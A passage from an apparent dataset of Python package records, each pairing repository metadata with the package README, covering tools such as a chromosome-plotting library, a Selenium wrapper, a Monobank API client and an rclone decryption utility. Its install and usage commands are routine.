| **color**                | list          | **color** is a list used for blocks, if the count of block greater than color count, it will be used circularly                                                                                                                                                                                                                                                      |
| **threshold_line_color** | valuelist | **value** if **threshold** is a single value**list** if **threshold** is a list                                                                                                                                                                                                                                                                                  |
| **threshold_line_width** | value         | **value** the line width of threshold lines                                                                                                                                                                                                                                                                                                                          |
| **block_line_width**     | value         | **value** if there are only one color, the block line will display as border, the width is set by this parameter                                                                                                                                                                                                                                                     |
| **log_base**             | value         | log_base = 0 means not calucate value with loglog_base != 0 means log base for log values with it                                                                                                                                                                                                                                                                |
| **reverse**              | Boolean       | if all data lower than 0, you may use it to show opposite values                                                                                                                                                                                                                                                                                                     |
| **other parameters**     | value         | same with parameters used in **pyplot.scatter**                                                                                                                                                                                                                                                                                                                      |







### Chromosome Plot

```python
import bioplotz as bp

fig, ax, clb = bp.chromosome(chr_len_db, bed_data, centro_pos, value_type=""numeric"", orientation=""vertical"", **kwargs)
```
| parameter            | value type                     | Optional | Default      | explain                                                                                                                                                                                                                                                                                                           |
|----------------------|--------------------------------|----------|--------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **chr_len_db**       | dict                           | No       | -            | **key**: chromosome name**value**: chromosome length                                                                                                                                                                                                                                                          |
| **chr_order**        | list                           | Yes      | None         | **list**: the custom chromosome order, like: [""Chr1"", ""Chr3"", ""Chr2""]must same with keys in chr_len                                                                                                                                                                                                           |
| **bed_data**         | list                           | Yes      | None         | **list**: two dimension list, like: [[chrome name, start pos, end pos, value/color]]                                                                                                                                                                                                                              |
| **centro_pos**       | dict                           | Yes      | None         | **key**: chromosome name**value**: middle position of centromere                                                                                                                                                                                                                                              |
| **value_type**       | str                            | Yes      | numeric      | **numeric**: the 4th column of bed_data should be value**color**: the 4th column of bed_data is color**marker**: different with other two types, it need 5 columns, the 4th column of bed_data is marker, the 5th column is color (marker is same with the parameter which be used in **pyplot.scatter**) |
| **orientation**      | str                            | Yes      | vertical     | ""vertical"" or ""horizontal""                                                                                                                                                                                                                                                                                        |
| **cmap**             | str                            | Yes      | gist_rainbow | **cmap** for colorbar                                                                                                                                                                                                                                                                                             |
| **cmap_parts**       | int                            | Yes      | 100          | how many parts for splitting cmap                                                                                                                                                                                                                                                                                 |
| **s**                | float or array-like, shape(n,) | Yes      | None         | same with parameter s use in **pyplot.scatter**                                                                                                                                                                                                                                                                   |
| **other parameters** | value                          | Yes      | None         | same with parameters used in **pyplot.plot**                                                                                                                                                                                                                                                                      |

- If value_type is numeric, the return value clb will be colorbar, else None







### Gene Cluster Plot

```python
import bioplotz as bp

fig, ax = bp.genecluster(gene_list)
```
| parameter     | value type  | Optional | Default | explain                                                                                                                                          |
|---------------|-------------|----------|---------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **gene_list** | list        | No       | -       | **list**: 2-dimension list, like [[gene name, start pos, end pos, direct(+/-), color], ..., [gene name, start pos, end pos, direct(+/-), color]] |
| **edgecolor** | liststr | Yes      | None    | **list**: same length with gene_list, like: [""green"", ""blue"", ..., ""red""]**str**: common edge color for all genes                            |
| **edgewidth** | int         | Yes      | 1       | edge width for all genes                                                                                                                         |
| **lw**        | int         | Yes      | 3       | line width to show the genome backbone                                                                                                           |

**Notice**, the best figsize should be (gene count, 1), for example: plt.figure(figsize=(16, 1)), and the bbox_inches parameter which in savefig should be 'tight'.






",sc-zhang/bioplotz
python-automation-framework,https://github.com/mreiche/python-automation-framework,0,2849,2849,"# PAF - Python Automation Framework

Python implementation of [Testerra](https://github.com/telekom/testerra) API.

It is basically a wrapper for Selenium *WebDriver* and *WebElement* which bring some more comfort features.
This is not a test framework, but it implements some assertion features anyway.

The basic concept is, to identify *WebElements* on every action or property accessor to prevent `StaleElementExceptions`.

## Quick start

```python
import inject
import paf.config
from paf.locator import By
from paf.page import FinderPage, PageFactory

# Configure dependency injection
inject.configure(paf.config.inject)

# Instantiate the page factory
page_factory = inject.instance(PageFactory)

# Create a simple finder page
page = page_factory.create_page(FinderPage)

# Visit URL
page.open(""https://google.com"")

# Find element
element = page.find(""#q"")

# Perform actions
element.type(""Search"")

# Perform assertions
element.expect.text.be(""Search"")
```

### Prerequisites

- You need at least a local *WebDriver* installed.
   ```shell
   brew|choco|apt install chromedriver
   ```

- Python 3.10 (or higher).

## Feature list

- [UiElements](doc/uielement.md)
- [Locators](doc/locators.md)
- [Page objects](doc/pages.md)
- [Components](doc/components.md)
- [Managing WebDrivers](doc/webdriver.md)
- [Execution controlling](doc/control.md)

### Missing features (todos)

- Rect assertions
- ShadowRoot support
- Drag & Drop over frames

## Environment variables

* `PAF_BROWSER_SETTING=chrome:90`: Sets the requested browser name and it's version.
* `PAF_WINDOW_SIZE=1920x1080`: Sets the browsers default window size.
* `PAF_SCREENSHOTS_DIR=screenshots`: Sets the screenshots' directory.
* `PAF_SEQUENCE_WAIT_AFTER_FAIL=0.3`: Wait in seconds whenever a sequence action fails. 
* `PAF_SEQUENCE_RETRY_COUNT=3`: Retry count for every sequence action.

## Examples

I added two examples.

1. [test_google.py](examples/test_google.py): is a regular Google search, implemented with [Page Objects](doc/pages.md) and [Components](doc/components.md). 
2. [test_todo_mvc.py](examples/test_todo_mvc.py): are re-implemented test cases from the [Robot Framework TodoMVC](https://docs.robotframework.org/docs/examples/todo) example. It's IMHO developer friendly, better readable and less code. 


## Developer area
### Run the tests
```shell
PYTHONPATH=""."" pytest --numprocesses=4 --cov=paf test
```

### Utils

```javascript
xpath = ""//dt[.//text()='Title:']/following-sibling::dd[1]""
snapshot = document.evaluate(xpath, document.body, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE)
snapshot.snapshotItem(0).textContent
```

### Release update
1. Update version in `setup.py`
2. Package library
    ```shell
    python setup.py sdist
    ```
3. Publish library
    ```shell
    twine upload dist/python-automation-framework-[version].tar.gz
    ```
","# PAF - Python Automation Framework

Python implementation of [Testerra](https://github.com/telekom/testerra) API.

It is basically a wrapper for Selenium *WebDriver* and *WebElement* which bring some more comfort features.
This is not a test framework, but it implements some assertion features anyway.

The basic concept is, to identify *WebElements* on every action or property accessor to prevent `StaleElementExceptions`.

## Quick start

```python
import inject
import paf.config
from paf.locator import By
from paf.page import FinderPage, PageFactory

# Configure dependency injection
inject.configure(paf.config.inject)

# Instantiate the page factory
page_factory = inject.instance(PageFactory)

# Create a simple finder page
page = page_factory.create_page(FinderPage)

# Visit URL
page.open(""https://google.com"")

# Find element
element = page.find(""#q"")

# Perform actions
element.type(""Search"")

# Perform assertions
element.expect.text.be(""Search"")
```

### Prerequisites

- You need at least a local *WebDriver* installed.
   ```shell
   brew|choco|apt install chromedriver
   ```

- Python 3.10 (or higher).

## Feature list

- [UiElements](doc/uielement.md)
- [Locators](doc/locators.md)
- [Page objects](doc/pages.md)
- [Components](doc/components.md)
- [Managing WebDrivers](doc/webdriver.md)
- [Execution controlling](doc/control.md)

### Missing features (todos)

- Rect assertions
- ShadowRoot support
- Drag & Drop over frames

## Environment variables

* `PAF_BROWSER_SETTING=chrome:90`: Sets the requested browser name and it's version.
* `PAF_WINDOW_SIZE=1920x1080`: Sets the browsers default window size.
* `PAF_SCREENSHOTS_DIR=screenshots`: Sets the screenshots' directory.
* `PAF_SEQUENCE_WAIT_AFTER_FAIL=0.3`: Wait in seconds whenever a sequence action fails. 
* `PAF_SEQUENCE_RETRY_COUNT=3`: Retry count for every sequence action.

## Examples

I added two examples.

1. [test_google.py](examples/test_google.py): is a regular Google search, implemented with [Page Objects](doc/pages.md) and [Components](doc/components.md). 
2. [test_todo_mvc.py](examples/test_todo_mvc.py): are re-implemented test cases from the [Robot Framework TodoMVC](https://docs.robotframework.org/docs/examples/todo) example. It's IMHO developer friendly, better readable and less code. 


## Developer area
### Run the tests
```shell
PYTHONPATH=""."" pytest --numprocesses=4 --cov=paf test
```

### Utils

```javascript
xpath = ""//dt[.//text()='Title:']/following-sibling::dd[1]""
snapshot = document.evaluate(xpath, document.body, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE)
snapshot.snapshotItem(0).textContent
```

### Release update
1. Update version in `setup.py`
2. Package library
    ```shell
    python setup.py sdist
    ```
3. Publish library
    ```shell
    twine upload dist/python-automation-framework-[version].tar.gz
    ```
",mreiche/python-automation-framework
assignment-manager,https://github.com/PraxTube/assignment-manager,3,21,21,"# Assignment Manager
","# Assignment Manager
",praxtube/assignment-manager
autoscale-queue-celery,https://github.com/autoscale-app/python-queue-celery,2,808,808,"# Python Queue Celery (Autoscale.app)

Produces [Celery] queue metrics for the [Autoscale.app] [Agent].

## Installation

Install the package:

    pip install autoscale-queue-celery

## Usage

Instructions are provided during the autoscaler setup process on [Autoscale.app].

## Development

Prepare environment:

    pip install poetry
    poetry install

Boot the shell:

    poetry shell

See Paver for relevant tasks:

    paver --help

## Release

1. Update `pyproject.toml` and `__init__.py`
2. Create and push a new tag (`v.1.2.3`)

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/autoscale-app/python-queue-celery

[Autoscale.app]: https://autoscale.app
[Agent]: https://github.com/autoscale-app/python-agent
[Celery]: https://docs.celeryq.dev/en/stable/

","# Python Queue Celery (Autoscale.app)

Produces [Celery] queue metrics for the [Autoscale.app] [Agent].

## Installation

Install the package:

    pip install autoscale-queue-celery

## Usage

Instructions are provided during the autoscaler setup process on [Autoscale.app].

## Development

Prepare environment:

    pip install poetry
    poetry install

Boot the shell:

    poetry shell

See Paver for relevant tasks:

    paver --help

## Release

1. Update `pyproject.toml` and `__init__.py`
2. Create and push a new tag (`v.1.2.3`)

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/autoscale-app/python-queue-celery

[Autoscale.app]: https://autoscale.app
[Agent]: https://github.com/autoscale-app/python-agent
[Celery]: https://docs.celeryq.dev/en/stable/

",autoscale-app/python-queue-celery
timelessnesses-typed-env,https://github.com/timelessnesses/typed_env,1,1169,1169,"# typed-env

A python module that help you have a type safety on enviroment variable

## Documentation

```python
timelessnesses.TypedEnv
```

A parent class that will help you ensure type safetiness on your enviroment variable.  
Usage:

```python
from timelessnesses import typed_env
import datetime

class MyDotEnv(typed_env.TypedEnv):
    # define your enviroment variable name and it's type (default value is optional and typing.Optional is also supported)
    AMONG_US: bool = True
    DISCORD_TOKEN: str
    DATETIME: datetime.datetime = datetime.datetime.now()
    NICE_DICTIONARY: typing.Dict[str, int] = {""a"": 1, ""b"": 2}
    DAMN_LIST: typing.List[int] = [1, 2, 3]
    BALLS_KIND: BallsEnum # oh no! TypedEnv doesn't support my custom class!
    # don't worry you can implement your own converter!

a = MyDotEnv()
a.add_validator(BallsEnum, lambda x: BallsEnum(int(x)))
a.load() # let it do the work!
```

`TypedEnv` supports normal types like `str` or `int` and also `typing.Dict` and `typing.List` etc. But it also supports custom type by adding a validator, you are also allowed to overwrite the default validator by using `TypedEnv.add_validator` method.
","# typed-env

A python module that help you have a type safety on enviroment variable

## Documentation

```python
timelessnesses.TypedEnv
```

A parent class that will help you ensure type safetiness on your enviroment variable.  
Usage:

```python
from timelessnesses import typed_env
import datetime

class MyDotEnv(typed_env.TypedEnv):
    # define your enviroment variable name and it's type (default value is optional and typing.Optional is also supported)
    AMONG_US: bool = True
    DISCORD_TOKEN: str
    DATETIME: datetime.datetime = datetime.datetime.now()
    NICE_DICTIONARY: typing.Dict[str, int] = {""a"": 1, ""b"": 2}
    DAMN_LIST: typing.List[int] = [1, 2, 3]
    BALLS_KIND: BallsEnum # oh no! TypedEnv doesn't support my custom class!
    # don't worry you can implement your own converter!

a = MyDotEnv()
a.add_validator(BallsEnum, lambda x: BallsEnum(int(x)))
a.load() # let it do the work!
```

`TypedEnv` supports normal types like `str` or `int` and also `typing.Dict` and `typing.List` etc. But it also supports custom type by adding a validator, you are also allowed to overwrite the default validator by using `TypedEnv.add_validator` method.
",timelessnesses/typed_env
neural-data-simulator,https://github.com/agencyenterprise/neural-data-simulator,15,1736,1736,"# Neural Data Simulator

[![Linting](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/lint.yml/badge.svg)](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/lint.yml)
[![Tests](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/test.yml/badge.svg)](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/test.yml)

The Neural Data Simulator is a real-time system for generating electrophysiology data from behavioral data (e.g. cursor movement, arm kinematics, etc) in real-time. The NDS system can be used to test and validate closed-loop brain-computer interface systems without the need for a human in the loop, generate synthetic data for algorithm optimization, and provide a platform on which to develop BCI decoders.

## Documentation

See the [documentation](https://agencyenterprise.github.io/neural-data-simulator/) for a complete system overview, installation instructions, and API details.

## Installation

Ensure that Python `>=3.9` and `<3.12` is installed. Then, proceed to install LSL:

```
# on Linux/WSL
conda install -c conda-forge liblsl

# on macOS
brew install labstreaminglayer/tap/lsl

# on Windows
# should be installed automatically by pip when installing NDS
```

Install the NDS package with the included examples and utilities via pip:

```
pip install ""neural-data-simulator[extras]""
```

## Quick start

Run the following scripts:

```
nds_post_install_config
run_closed_loop
```
![quick-start](https://raw.githubusercontent.com/agencyenterprise/neural-data-simulator/main/docs/source/images/quick-start.gif)

> **_NOTE:_** You might need to give permissions like network access when running the scripts.
","# Neural Data Simulator

[![Linting](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/lint.yml/badge.svg)](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/lint.yml)
[![Tests](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/test.yml/badge.svg)](https://github.com/agencyenterprise/neural-data-simulator/actions/workflows/test.yml)

The Neural Data Simulator is a real-time system for generating electrophysiology data from behavioral data (e.g. cursor movement, arm kinematics, etc) in real-time. The NDS system can be used to test and validate closed-loop brain-computer interface systems without the need for a human in the loop, generate synthetic data for algorithm optimization, and provide a platform on which to develop BCI decoders.

## Documentation

See the [documentation](https://agencyenterprise.github.io/neural-data-simulator/) for a complete system overview, installation instructions, and API details.

## Installation

Ensure that Python `>=3.9` and `<3.12` is installed. Then, proceed to install LSL:

```
# on Linux/WSL
conda install -c conda-forge liblsl

# on macOS
brew install labstreaminglayer/tap/lsl

# on Windows
# should be installed automatically by pip when installing NDS
```

Install the NDS package with the included examples and utilities via pip:

```
pip install ""neural-data-simulator[extras]""
```

## Quick start

Run the following scripts:

```
nds_post_install_config
run_closed_loop
```
![quick-start](https://raw.githubusercontent.com/agencyenterprise/neural-data-simulator/main/docs/source/images/quick-start.gif)

> **_NOTE:_** You might need to give permissions like network access when running the scripts.
",agencyenterprise/neural-data-simulator
gpt-bot,https://github.com/hzhangxyz/gpt-bot,5,664,664,"# gpt-bot

A GPT Command line interface bot.

This is only for gpt-3.5-turbo currently.
You need to set `OPENAI_API_KEY` in environment variable.
And maybe `OPENAI_PROXY` is also useful if you need proxy.

## Usage

`python -m gpt_bot` and enjoy.

## Command

- `/multiline`: toggle multiline input.
- `/prompt`: change [system content](https://platform.openai.com/docs/guides/chat) during chatting.
- `/rollback`: rollback the last conversation.
- `/history`: show chat history.
- `/edit`: edit what bot said just now.
- `/record`: use openai's [whister](https://platform.openai.com/docs/guides/speech-to-text) to transcribe what you are saying.
- `/quit`: quit.
","# gpt-bot

A GPT Command line interface bot.

This is only for gpt-3.5-turbo currently.
You need to set `OPENAI_API_KEY` in environment variable.
And maybe `OPENAI_PROXY` is also useful if you need proxy.

## Usage

`python -m gpt_bot` and enjoy.

## Command

- `/multiline`: toggle multiline input.
- `/prompt`: change [system content](https://platform.openai.com/docs/guides/chat) during chatting.
- `/rollback`: rollback the last conversation.
- `/history`: show chat history.
- `/edit`: edit what bot said just now.
- `/record`: use openai's [whister](https://platform.openai.com/docs/guides/speech-to-text) to transcribe what you are saying.
- `/quit`: quit.
",hzhangxyz/gpt-bot
aiomonobank,https://github.com/TT1410/aiomonobank,5,3807,3421,"===========
AIOMonobank
===========

Asynchronous Python library for `monobank <https://api.monobank.ua/docs>`_ API


.. image:: https://img.shields.io/pypi/l/aiomonobank.svg?style=flat-square
    :target: https://opensource.org/licenses/MIT
    :alt: MIT License

.. image:: https://img.shields.io/pypi/status/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: PyPi status

.. image:: https://img.shields.io/pypi/v/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: PyPi Package Version

.. image:: https://img.shields.io/pypi/dm/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: Downloads

.. image:: https://img.shields.io/pypi/pyversions/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: Supported python versions

Setup
=====

- You get token for your client from `MonobankAPI <https://api.monobank.ua/>`_.
- Install the **latest version** of the **aiomonobank**: ``pip install aiomonobank``


Examples
========

We currently have 2 different classes for using the Monobank API:
-----------------------------------------------------------------

- ``MonoPublic`` is simple base class for others, can only get currencies
- ``MonoPersonal`` - this class for talk to personal Monobank API


`get_currency <https://api.monobank.ua/docs/#tag/Publichni-dani/paths/~1bank~1currency/get>`_ request
-----------------------------------------------------------------------------------------------------

.. code-block:: python

    import json
    import asyncio

    from aiomonobank import MonoPublic, types


    async def main():
        async with MonoPublic() as mono_client:
            currencies: list[types.Currency] = await mono_client.get_currency()

        for currency in currencies:
            print(currency)

    if __name__ == '__main__':
        asyncio.run(main())


`get_client_info <https://api.monobank.ua/docs/#tag/Kliyentski-personalni-dani/paths/~1personal~1client-info/get>`_ request
----------------------------------------------------------------------------------------------------------------------------

.. code-block:: python

    import asyncio

    from aiomonobank import MonoPersonal

    MONOBANK_API_TOKEN = 'your_token'


    async def main():
        mono_client = MonoPersonal(MONOBANK_API_TOKEN)
        try:
            client_info = await mono_client.get_client_info()

            print(f""Client name: {client_info.name}"")
            print(client_info)
        finally:
            await mono_client.close()


    if __name__ == '__main__':
        asyncio.run(main())


`get_statement <https://api.monobank.ua/docs/#tag/Kliyentski-personalni-dani/paths/~1personal~1statement~1{account}~1{from}~1{to}/get>`_ request
-------------------------------------------------------------------------------------------------------------------------------------------------

.. code-block:: python

    import asyncio
    from datetime import datetime, timedelta

    from aiomonobank import MonoPersonal

    MONOBANK_API_TOKEN = 'your_token'


    async def main():
        mono_client = MonoPersonal(MONOBANK_API_TOKEN)
        try:
            transactions = await mono_client.get_statement(
                account_id='0',
                from_datetime=datetime.utcnow() - timedelta(days=3),
                to_datetime=datetime.utcnow() - timedelta(days=2)
            )

            for transaction in transactions:
                print(transaction)
        finally:
            await mono_client.close()


    if __name__ == '__main__':
        asyncio.run(main())


Resources:
==========

- PyPI: `aiomonobank <https://pypi.org/project/aiomonobank>`_
- Documentation: (soon)
","===========
AIOMonobank
===========

Asynchronous Python library for `monobank `_ API


.. image:: https://img.shields.io/pypi/l/aiomonobank.svg?style=flat-square
    :target: https://opensource.org/licenses/MIT
    :alt: MIT License

.. image:: https://img.shields.io/pypi/status/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: PyPi status

.. image:: https://img.shields.io/pypi/v/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: PyPi Package Version

.. image:: https://img.shields.io/pypi/dm/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: Downloads

.. image:: https://img.shields.io/pypi/pyversions/aiomonobank.svg?style=flat-square
    :target: https://pypi.python.org/pypi/aiomonobank
    :alt: Supported python versions

Setup
=====

- You get token for your client from `MonobankAPI `_.
- Install the **latest version** of the **aiomonobank**: ``pip install aiomonobank``


Examples
========

We currently have 2 different classes for using the Monobank API:
-----------------------------------------------------------------

- ``MonoPublic`` is simple base class for others, can only get currencies
- ``MonoPersonal`` - this class for talk to personal Monobank API


`get_currency `_ request
-----------------------------------------------------------------------------------------------------

.. code-block:: python

    import json
    import asyncio

    from aiomonobank import MonoPublic, types


    async def main():
        async with MonoPublic() as mono_client:
            currencies: list[types.Currency] = await mono_client.get_currency()

        for currency in currencies:
            print(currency)

    if __name__ == '__main__':
        asyncio.run(main())


`get_client_info `_ request
----------------------------------------------------------------------------------------------------------------------------

.. code-block:: python

    import asyncio

    from aiomonobank import MonoPersonal

    MONOBANK_API_TOKEN = 'your_token'


    async def main():
        mono_client = MonoPersonal(MONOBANK_API_TOKEN)
        try:
            client_info = await mono_client.get_client_info()

            print(f""Client name: {client_info.name}"")
            print(client_info)
        finally:
            await mono_client.close()


    if __name__ == '__main__':
        asyncio.run(main())


`get_statement `_ request
-------------------------------------------------------------------------------------------------------------------------------------------------

.. code-block:: python

    import asyncio
    from datetime import datetime, timedelta

    from aiomonobank import MonoPersonal

    MONOBANK_API_TOKEN = 'your_token'


    async def main():
        mono_client = MonoPersonal(MONOBANK_API_TOKEN)
        try:
            transactions = await mono_client.get_statement(
                account_id='0',
                from_datetime=datetime.utcnow() - timedelta(days=3),
                to_datetime=datetime.utcnow() - timedelta(days=2)
            )

            for transaction in transactions:
                print(transaction)
        finally:
            await mono_client.close()


    if __name__ == '__main__':
        asyncio.run(main())


Resources:
==========

- PyPI: `aiomonobank `_
- Documentation: (soon)
",tt1410/aiomonobank
rclone-decrypt,https://github.com/MitchellThompkins/rclone-decrypt,4,3468,3468,"# rclone-decrypt
## Status
![test](https://github.com/mitchellthompkins/rclone-decrypt/actions/workflows/test.yml/badge.svg)
![build](https://github.com/mitchellthompkins/rclone-decrypt/actions/workflows/build_app.yml/badge.svg)

## Description
`rclone-decrypt` is a utility which will decrypt files that were encrypted with
[rclone](https://rclone.org/). The anticipated use-case is that a user has
independently downloaded an **encrypted** file or directory directly from a
remote cloud storage (Backblaze B2/Amazon Drive/Dropbox/etc...) and now wants to
decrypt it.

Given an rclone.conf file, this tool is simply a wrapper around `rclone` which
sets up a ""local remote"" to host the downloaded encrypted files and then calls
`rclone copy` in order to decrypt the files into a desired output folder.

Ostensibly I did this because my family backs-up our local NAS to a remote host
but the rest of my family prefers to download files one-off from the cloud host
and are not comfortable using the rclone CLI. This offers a CLI in addition to
an easy-to-use GUI to make life simple.

### Notes
* **Use at your own risk! Be sure you have copies of anything you're trying to
decrypt, just in case something goes wrong!**
* When decrypting files with encrypted filenames or folder names, the directory
  or filename must _only_ consist of the encrypted version. For example, if an
  encrypted file was downloaded as `path_to_encypted_file_4567asd8fasdf67asdf`
  where `4567asd8fasdf67asdf` is the encrypted part, the filename must be
  renamed to exclude the `path_to_encypted_file_` portion. Otherwise rclone will
  complain about invalid encryption names.
* Windows is _not_ currently supported, although it probably would not take very
  much work to get it there. I do not have ready access to a windows environment
  on which to test.
* I'd love to make the GUI look more modern, but most solutions involve a style
  which seems incompatible with
  [tkinterdnd2](https://github.com/Eliav2/tkinterdnd2) which provides the drag
  and drop feature.

## Installation
```
pip3 install rclone-decrypt
```

## Requirements
### General
* `rclone` must be installed and in `$PATH`

### Python environment
* `Python >= 3.7 <3.12`
* `Python-tk` must be installed if using the GUI

### Executable
**UNDER DEVELOPMENT** An OSX `.app` is generated but is currently untested.

## Usage
### CLI usage
```
> rclone-decrypt --config /path/to/rclone.conf --files /path/to/file/or/dir/
```

Example usages:
```
> rclone-decrypt --config rclone.conf --files /home/my_encrypted_dir
> rclone-decrypt --config rclone.conf --files /0f12hh28evsof1kgflv67ldcn/9g6h49o4ht35u7o5e4iv5a1h28
> rclone-decrypt --config rclone.conf --files /home/my_encrypted_file.bin
```
### GUI usage
If the python package is installed directly then the GUI can be invoked from the
command line, as shown below. Otherwise the packaged binary can be downloaded
and executed directly.
* Files can be dropped directly into the big white box.
* As files are dropped, if no output directory has been provided though the file
  dialog, an output directory called 'out' will be created at the same directory
  level as the last dropped file to be decrypted.
* A default location for `rclone.conf` is provided, others can be browsed for.
```
rclone-decrypt --gui
```

![rclone_example](docs/imgs/rclone_gui.png)

## Development
```
source .venv/bin/activate
poetry install
poetry run pytest
poetry run flake8
deactivate
```
","# rclone-decrypt
## Status
![test](https://github.com/mitchellthompkins/rclone-decrypt/actions/workflows/test.yml/badge.svg)
![build](https://github.com/mitchellthompkins/rclone-decrypt/actions/workflows/build_app.yml/badge.svg)

## Description
`rclone-decrypt` is a utility which will decrypt files that were encrypted with
[rclone](https://rclone.org/). The anticipated use-case is that a user has
independently downloaded an **encrypted** file or directory directly from a
remote cloud storage (Backblaze B2/Amazon Drive/Dropbox/etc...) and now wants to
decrypt it.

Given an rclone.conf file, this tool is simply a wrapper around `rclone` which
sets up a ""local remote"" to host the downloaded encrypted files and then calls
`rclone copy` in order to decrypt the files into a desired output folder.

Ostensibly I did this because my family backs-up our local NAS to a remote host
but the rest of my family prefers to download files one-off from the cloud host
and are not comfortable using the rclone CLI. This offers a CLI in addition to
an easy-to-use GUI to make life simple.

### Notes
* **Use at your own risk! Be sure you have copies of anything you're trying to
decrypt, just in case something goes wrong!**
* When decrypting files with encrypted filenames or folder names, the directory
  or filename must _only_ consist of the encrypted version. For example, if an
  encrypted file was downloaded as `path_to_encypted_file_4567asd8fasdf67asdf`
  where `4567asd8fasdf67asdf` is the encrypted part, the filename must be
  renamed to exclude the `path_to_encypted_file_` portion. Otherwise rclone will
  complain about invalid encryption names.
* Windows is _not_ currently supported, although it probably would not take very
  much work to get it there. I do not have ready access to a windows environment
  on which to test.
* I'd love to make the GUI look more modern, but most solutions involve a style
  which seems incompatible with
  [tkinterdnd2](https://github.com/Eliav2/tkinterdnd2) which provides the drag
  and drop feature.

## Installation
```
pip3 install rclone-decrypt
```

## Requirements
### General
* `rclone` must be installed and in `$PATH`

### Python environment
* `Python >= 3.7 <3.12`
* `Python-tk` must be installed if using the GUI

### Executable
**UNDER DEVELOPMENT** An OSX `.app` is generated but is currently untested.

## Usage
### CLI usage
```
> rclone-decrypt --config /path/to/rclone.conf --files /path/to/file/or/dir/
```

Example usages:
```
> rclone-decrypt --config rclone.conf --files /home/my_encrypted_dir
> rclone-decrypt --config rclone.conf --files /0f12hh28evsof1kgflv67ldcn/9g6h49o4ht35u7o5e4iv5a1h28
> rclone-decrypt --config rclone.conf --files /home/my_encrypted_file.bin
```
### GUI usage
If the python package is installed directly then the GUI can be invoked from the
command line, as shown below. Otherwise the packaged binary can be downloaded
and executed directly.
* Files can be dropped directly into the big white box.
* As files are dropped, if no output directory has been provided though the file
  dialog, an output directory called 'out' will be created at the same directory
  level as the last dropped file to be decrypted.
* A default location for `rclone.conf` is provided, others can be browsed for.
```
rclone-decrypt --gui
```

![rclone_example](docs/imgs/rclone_gui.png)

## Development
```
source .venv/bin/activate
poetry install
poetry run pytest
poetry run flake8
deactivate
```
",mitchellthompkins/rclone-decrypt
huntflow-api-client,https://github.com/huntflow/huntflow-api-client-python,3,488,488,"[![](https://img.shields.io/pypi/pyversions/huntflow-api-client.svg)](https://pypi.org/project/huntflow-api-client/)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Imports: isort](https://img.shields.io/badge/%20imports-isort-%231674b1?style=flat&labelColor=ef8336)](https://pycqa.github.io/isort/)

# huntflow-api-client
Huntflow API Client for Python


## Installation
Install using `pip install huntflow-api-client`
","[![](https://img.shields.io/pypi/pyversions/huntflow-api-client.svg)](https://pypi.org/project/huntflow-api-client/)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Imports: isort](https://img.shields.io/badge/%20imports-isort-%231674b1?style=flat&labelColor=ef8336)](https://pycqa.github.io/isort/)

# huntflow-api-client
Huntflow API Client for Python


## Installation
Install using `pip install huntflow-api-client`
",huntflow/huntflow-api-client-python
toml-tools,https://github.com/JamesParrott/toml_tools,0,13308,12131,"# toml_tools, Tomli and Tomli-W for Python 2 and Iron Python

v1.0.0 is a complete overhaul.  toml_tools is now based on tomli and tomli-w.

# Parent Project number (1/2)'s Readme File (Tomli)

> A lil' TOML parser

**Table of Contents**  *generated with [mdformat-toc](https://github.com/hukkin/mdformat-toc)*

<!-- mdformat-toc start --slug=github --maxlevel=6 --minlevel=2 -->

- [Intro](#intro)
- [Installation](#installation)
- [Usage](#usage)
  - [Parse a TOML string](#parse-a-toml-string)
  - [Parse a TOML file](#parse-a-toml-file)
  - [Handle invalid TOML](#handle-invalid-toml)
  - [Construct `decimal.Decimal`s from TOML floats](#construct-decimaldecimals-from-toml-floats)
  - [Building a `tomli`/`tomllib` compatibility layer](#building-a-tomlitomllib-compatibility-layer)
- [FAQ](#faq)
  - [Why this parser?](#why-this-parser)
  - [Is comment preserving round-trip parsing supported?](#is-comment-preserving-round-trip-parsing-supported)
  - [Is there a `dumps`, `write` or `encode` function?](#is-there-a-dumps-write-or-encode-function)
  - [How do TOML types map into Python types?](#how-do-toml-types-map-into-python-types)
- [Performance](#performance)

<!-- mdformat-toc end -->

## Intro<a name=""intro""></a>

Tomli is a Python library for parsing [TOML](https://toml.io).
It is fully compatible with [TOML v1.0.0](https://toml.io/en/v1.0.0).

A version of Tomli, the `tomllib` module,
was added to the standard library in Python 3.11
via [PEP 680](https://www.python.org/dev/peps/pep-0680/).
Tomli continues to provide a backport on PyPI for Python versions
where the standard library module is not available
and that have not yet reached their end-of-life.

## Installation<a name=""installation""></a>

```bash
pip install tomli
```

## Usage<a name=""usage""></a>

### Parse a TOML string<a name=""parse-a-toml-string""></a>

```python
import tomli

toml_str = """"""
[[players]]
name = ""Lehtinen""
number = 26

[[players]]
name = ""Numminen""
number = 27
""""""

toml_dict = tomli.loads(toml_str)
assert toml_dict == {
    ""players"": [{""name"": ""Lehtinen"", ""number"": 26}, {""name"": ""Numminen"", ""number"": 27}]
}
```

### Parse a TOML file<a name=""parse-a-toml-file""></a>

```python
import tomli

with open(""path_to_file/conf.toml"", ""rb"") as f:
